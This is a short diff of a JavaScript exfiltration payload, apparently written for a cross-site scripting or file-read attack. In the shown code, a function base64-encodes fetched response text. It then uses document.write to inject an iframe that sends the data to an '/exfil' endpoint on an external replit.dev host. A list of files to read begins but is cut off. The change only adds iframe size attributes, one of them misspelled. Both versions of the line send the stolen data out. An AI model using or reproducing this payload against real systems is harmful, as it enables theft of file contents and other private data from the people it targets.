@@ -1,6 +1,6 @@
 function reqListener() {
     var b64 = btoa(this.responseText);
-    document.write('<iframe src="https://917bfb23-67d7-4fb1-bb32-0350c424dde0-00-1eqsn09i0sk29.spock.replit.dev/exfil?data=' + b64 + '"></iframe>');
+    document.write('<iframe widht="800" height="900" src="https://917bfb23-67d7-4fb1-bb32-0350c424dde0-00-1eqsn09i0sk29.spock.replit.dev/exfil?data=' + b64 + '"></iframe>');
 }
 
 var filesToRead = [
